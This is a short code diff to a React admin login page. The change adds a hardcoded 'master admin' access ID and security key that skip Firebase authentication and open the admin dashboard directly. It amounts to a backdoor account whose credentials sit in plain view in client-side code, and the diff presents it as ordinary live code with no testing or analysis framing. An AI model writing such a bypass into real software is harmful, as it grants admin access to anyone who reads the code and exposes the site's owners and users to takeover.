@@ -12,6 +12,14 @@ export default function AdminLogin() {
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Check for master admin credentials first
+    if (accessId === '15599873676' && securityKey === '963369') {
+      navigate('/admin/dashboard');
+      return;
+    }
+
+    // Proceed with Firebase Auth for other users
     try {
       await signInWithEmailAndPassword(auth, `${accessId}@nextcreatives.co`, securityKey);
       navigate('/admin/dashboard');
